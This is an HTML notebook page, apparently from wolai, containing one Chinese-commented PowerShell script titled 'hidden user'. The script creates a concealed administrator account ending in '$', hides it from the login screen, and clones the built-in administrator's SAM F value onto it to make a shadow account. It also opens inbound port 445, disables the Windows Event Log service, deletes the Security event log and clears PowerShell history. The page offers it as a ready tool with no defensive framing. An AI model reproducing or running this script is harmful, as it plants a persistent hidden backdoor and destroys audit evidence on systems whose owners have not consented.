@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="zh-Hans-CN"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=Edge"/><link rel="stylesheet" type="text/css" href="../../css/modern-norm.min.css"/><link rel="stylesheet" type="text/css" href="../../css/prism.min.css"/><link rel="stylesheet" type="text/css" href="../../css/katex.min.css"/><link rel="stylesheet" type="text/css" href="../../css/wolai.css"/><title>隐藏用户 - wolai 笔记</title><link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns=&apos;http://www.w3.org/2000/svg&apos; viewBox=&apos;0 0 800 800&apos;%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23fff;%7D%3C/style%3E%3C/defs%3E%3Cg%3E%3Cpath class=&apos;cls-1&apos; d=&apos;M610.08,0c66,0,90,6.88,114.13,19.79a134.62,134.62,0,0,1,56,56l2.28,4.4C793.93,103,800,127.88,800,189.92V610.08l-.08,11.56c-.78,57.38-7.58,79.89-19.71,102.57a134.62,134.62,0,0,1-56,56l-4.4,2.28C697,793.93,672.12,800,610.08,800H189.92l-11.56-.08c-57.38-.78-79.89-7.58-102.57-19.71a134.62,134.62,0,0,1-56-56l-2.28-4.4C6.44,697.75.4,673.72,0,616L0,189.92c0-66,6.88-90,19.79-114.13a134.62,134.62,0,0,1,56-56l4.4-2.28C102.25,6.44,126.28.4,184,0Z&apos;/%3E%3Cpath d=&apos;M610.08,0c66,0,90,6.88,114.13,19.79a134.62,134.62,0,0,1,56,56l2.28,4.4C793.93,103,800,127.88,800,189.92V610.08l-.08,11.56c-.78,57.38-7.58,79.89-19.71,102.57a134.62,134.62,0,0,1-56,56l-4.4,2.28C697,793.93,672.12,800,610.08,800H189.92l-11.56-.08c-57.38-.78-79.89-7.58-102.57-19.71a134.62,134.62,0,0,1-56-56l-2.28-4.4C6.44,697.75.4,673.72,0,616L0,189.92c0-66,6.88-90,19.79-114.13a134.62,134.62,0,0,1,56-56l4.4-2.28C102.25,6.44,126.28.4,184,0Zm4.72,88.9H185.2L172.42,89c-32.78.62-43.68,3.24-54.71,9.14a45.84,45.84,0,0,0-19.54,19.54c-6.61,12.36-9.11,24.55-9.27,67.49V614.8L89,627.58c.62,32.78,3.24,43.68,9.14,54.71a45.84,45.84,0,0,0,19.54,19.54c12.36,6.61,24.55,9.11,67.49,9.27H610.08c46.79,0,59.41-2.44,72.21-9.28a45.84,45.84,0,0,0,19.54-19.54c6.61-12.36,9.11-24.55,9.27-67.49V189.92c0-46.79-2.44-59.41-9.28-72.21a45.84,45.84,0,0,0-19.54-19.54C669.93,91.56,657.74,89.06,614.8,88.9ZM233.33,493.33A73.34,73.34,0,1,1,160,566.67,73.35,73.35,0,0,1,233.33,493.33Z&apos;/%3E%3C/g%3E%3C/svg%3E"></link></head><body class="full-width small-font less-lead"><header><div class="image"></div><div class="title"><div class="banner"><div class="icon"></div></div><div data-title="隐藏用户" class="main-title"></div></div></header><article><code-block id="6UxV7j98FAaGj4uDPNsaVj" class="wolai-block"><div class="wolai-pre"><div data-lang="Powershell" class="marker"></div><pre style="white-space: pre-wrap; word-break: break-all"><span class="token comment"># 尾部带$符号的账号在命令net user用不会列出</span>
+<span class="token variable">$account</span>=<span class="token string">"IUSERS$"</span>
+<span class="token variable">$password</span> = <span class="token string">"Admin123"</span> <span class="token punctuation">|</span> <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force
+
+<span class="token comment"># 创建用户</span>
+<span class="token function">New-LocalUser</span> <span class="token operator">-</span>Name <span class="token variable">$account</span>  <span class="token operator">-</span>Password <span class="token variable">$password</span> <span class="token operator">-</span>PasswordNeverExpires <span class="token operator">-</span>UserMayNotChangePassword  <span class="token operator">-</span>ErrorAction Ignore
+<span class="token function">Add-LocalGroupMember</span> <span class="token operator">-</span><span class="token function">Group</span> administrators <span class="token operator">-</span>Member <span class="token variable">$account</span>  <span class="token operator">-</span>ErrorAction Ignore
+
+<span class="token comment"># 在登录界面中隐藏,注册表设置完成立即生效</span>
+<span class="token variable">$reg</span>=<span class="token string">"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span><span class="token punctuation">(</span><span class="token function">test-path</span> <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">New-Item</span> <span class="token operator">-</span><span class="token function">type</span> Directory <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span> <span class="token operator">-</span>force  <span class="token punctuation">|</span> <span class="token function">out-null</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$account</span><span class="token punctuation">)</span> <span class="token operator">-or</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$account</span><span class="token punctuation">)</span> <span class="token operator">-gt</span> 0<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">Set-ItemProperty</span> <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span> <span class="token operator">-</span>name <span class="token variable">$account</span> <span class="token operator">-</span>value 0 <span class="token operator">-</span>propertyType dword <span class="token punctuation">|</span> <span class="token function">out-null</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">New-ItemProperty</span> <span class="token variable">$reg</span><span class="token string">"SpecialAccounts\UserList"</span> <span class="token operator">-</span>name <span class="token variable">$account</span> <span class="token operator">-</span>value 0 <span class="token operator">-</span>propertyType dword <span class="token operator">-</span>ErrorAction Ignore <span class="token punctuation">|</span> <span class="token function">out-null</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment"># 添加对administrators对SAM项的访问</span>
+<span class="token function">Write-Output</span> <span class="token string">"HKEY_LOCAL_MACHINE\SAM [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$account</span> [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [1 17]
+"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+regini <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+
+<span class="token comment"># 获取目标用户的默认值的类型</span>
+<span class="token variable">$target_user</span>=reg query HKLM\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$account</span> <span class="token operator">/</span>z <span class="token punctuation">|</span> <span class="token function">Where-Object</span> <span class="token punctuation">{</span> <span class="token variable">$_</span> <span class="token operator">-Match</span> <span class="token string">"REG_NONE"</span><span class="token punctuation">}</span>
+<span class="token variable">$target_key</span>=<span class="token punctuation">(</span><span class="token string">"{0:x}"</span> <span class="token operator">-</span>f <span class="token namespace">[int]</span> <span class="token variable">$target_user</span><span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>9<span class="token punctuation">]</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token string">"()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ToString<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token variable">$target_user</span> = <span class="token string">"00000"</span><span class="token operator">+</span><span class="token variable">$target_key</span>
+<span class="token comment">#HKLM\SAM\SAM\Domains\Account\Users\$value</span>
+
+<span class="token comment"># 将administrator的F键复制到目标用户的F键上</span>
+<span class="token variable">$admin_f</span>=<span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> HKLM:\SAM\SAM\Domains\Account\Users\000001F4 F<span class="token punctuation">)</span><span class="token punctuation">.</span>F
+<span class="token function">Write-Output</span> <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$target_user</span> [1 17]
+"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+regini <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+<span class="token function">Set-ItemProperty</span> HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$target_user</span> F <span class="token variable">$admin_F</span> <span class="token operator">-</span><span class="token function">type</span> Binary
+
+<span class="token comment"># 备份注册表</span>
+<span class="token function">copy-Item</span> <span class="token operator">-</span>Path  HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$target_user</span>  HKLM:\SAM\SAM\Domains\Account\Users\save
+<span class="token function">Write-Output</span> <span class="token string">"Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$account</span>]
+@=hex(<span class="token variable">$target_key</span>):
+"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+<span class="token function">cp</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt C:\users\pread\Desktop\regini<span class="token punctuation">.</span>txt
+
+<span class="token comment"># 删除用户</span>
+<span class="token function">Remove-LocalUser</span> <span class="token operator">-</span>name <span class="token variable">$account</span> <span class="token operator">-</span>ErrorAction Ignore
+
+<span class="token comment"># 恢复被删除用户的注册表</span>
+<span class="token function">Rename-Item</span> <span class="token operator">-</span>Path  HKLM:\SAM\SAM\Domains\Account\Users\save <span class="token operator">-</span>NewName <span class="token string">"<span class="token variable">$target_user</span>"</span> <span class="token operator">-</span>ErrorAction Ignore
+regedit <span class="token operator">/</span>s <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+<span class="token function">rm</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+<span class="token function">enable-localuser</span> <span class="token variable">$account</span>
+
+<span class="token comment"># 恢复注册表权限</span>
+<span class="token function">Write-Output</span> <span class="token string">"HKEY_LOCAL_MACHINE\SAM [17]
+HKEY_LOCAL_MACHINE\SAM\SAM [17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$account</span> [17]
+HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [17]
+"</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+regini <span class="token variable">$env</span>:TEMP\regini<span class="token punctuation">.</span>txt
+
+<span class="token comment"># 打开445端口</span>
+<span class="token function">New-NetFirewallRule</span> <span class="token operator">-</span>Name <span class="token string">"net"</span> <span class="token operator">-</span>DisplayName <span class="token string">"net"</span> <span class="token operator">-</span>Enabled 1 <span class="token operator">-</span>Direction Inbound <span class="token operator">-</span>Action Allow <span class="token operator">-</span>LocalPort 445 <span class="token operator">-</span>Protocol TCP <span class="token operator">-</span>ErrorAction Ignore
+
+<span class="token comment"># 关闭windows事件服务</span>
+<span class="token function">Set-ItemProperty</span> HKLM:SYSTEM\CurrentControlSet\Services\EventLog <span class="token operator">-</span>name <span class="token string">"Start"</span> <span class="token operator">-</span>value 4 <span class="token operator">-</span><span class="token function">type</span> DWord
+<span class="token function">Set-ItemProperty</span> HKLM:SYSTEM\CurrentControlSet\Services\EventLog <span class="token operator">-</span>name <span class="token string">"FailureActions"</span> <span class="token operator">-</span>value 128<span class="token punctuation">,</span>81<span class="token punctuation">,</span>1<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>3<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>20<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>96<span class="token punctuation">,</span>234<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0<span class="token punctuation">,</span>0 <span class="token operator">-</span><span class="token function">type</span> Binary
+<span class="token function">Remove-Item</span> <span class="token operator">-</span>Force C:\Windows\System32\Winevt\Logs\Security<span class="token punctuation">.</span>evtx <span class="token operator">-</span>ErrorAction Ignore
+
+<span class="token function">clear-history</span>
+<span class="token function">remove-item</span> <span class="token punctuation">(</span><span class="token function">get-psreadlineoption</span><span class="token punctuation">)</span><span class="token punctuation">.</span>HistorySavePath <span class="token operator">-</span>ErrorAction Ignore
+<span class="token keyword">exit</span>
+</pre></div></code-block></article><footer></footer></body></html>
